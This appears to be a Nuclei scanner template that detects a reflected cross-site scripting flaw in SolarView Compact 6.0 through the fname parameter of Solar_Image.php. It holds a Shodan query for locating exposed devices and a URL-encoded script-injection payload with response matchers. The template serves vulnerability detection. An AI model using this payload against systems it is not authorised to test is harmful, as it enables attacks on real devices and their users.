id: solarview-compact-xss
info:
  author: ritikchaddha
  description: 'SolarView Compact v6.0 is vulnerable to cross-site scripting (XSS)
    vulnerability via `fname` at /Solar_Image.php.

    '
  metadata:
    shodan-query: http.html:"SolarView Compact"
    verified: true
  name: SolarView Compact 6.00 - Cross-Site Scripting(XSS)
  severity: medium
  tags: xss,solarview
requests:
- matchers:
  - part: body
    type: word
    words:
    - value="test"><script>alert(document.domain)</script>">
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/Solar_Image.php?mode=resize&fname=test%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
